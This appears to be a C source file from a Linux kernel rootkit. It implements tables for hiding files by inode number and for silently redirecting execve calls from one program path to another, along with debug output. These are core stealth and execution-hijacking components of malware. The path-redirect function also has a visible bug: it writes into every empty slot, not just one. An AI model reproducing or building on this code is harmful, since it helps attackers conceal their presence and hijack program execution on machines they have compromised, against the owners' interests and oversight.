#include <linux/printk.h>

#include <anima/config.h>
#include <anima/libc.h>

static u64 hidden_inodes[MAX_HIDDEN_INODES] = {0};

int is_inode_hidden(u64 ino)
{
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i] == ino)
			return 1;
	return 0;
}

void hide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu\n", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (!hidden_inodes[i] || hidden_inodes[i] == ino) {
			hidden_inodes[i] = ino;
			break;
		}
	}
}

void unhide_inode(u64 ino)
{
	pr_debug("%s: ino=%llu\n", __func__, ino);

	for (int i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_inodes[i] == ino) {
			hidden_inodes[i] = 0;
			break;
		}
	}
}

struct redirect_path {
	char *old_path;
	char *new_path;
};

struct redirect_path redirect_pathes[16] = { {NULL, NULL} };

char *redirect_execve(char *old_path)
{
	for (int i = 0; i < 16; i++)
		if (redirect_pathes[i].old_path
		    && !anima_strcmp(redirect_pathes[i].old_path, old_path))
			return redirect_pathes[i].new_path;

	return NULL;
}

void redirect_execve_path(char *old_path, char *new_path)
{
	for (int i = 0; i < 16; i++) {
		if (!redirect_pathes[i].old_path) {
			redirect_pathes[i].old_path = old_path;
			redirect_pathes[i].new_path = new_path;
		}
	}
}

void unredirect_execve_path(const char *old_path)
{
	for (int i = 0; i < 16; i++) {
		if (redirect_pathes[i].old_path
		    && !anima_strcmp(redirect_pathes[i].old_path, old_path)) {
			redirect_pathes[i].old_path = NULL;
			redirect_pathes[i].new_path = NULL;
		}
	}
}

void hide_inode_debug(void)
{
	pr_debug("%s: hidden inodes\n", __func__);
	for (int i = 0; i < MAX_HIDDEN_INODES; i++)
		if (hidden_inodes[i])
			pr_debug("\tino=%llu\n", hidden_inodes[i]);
}
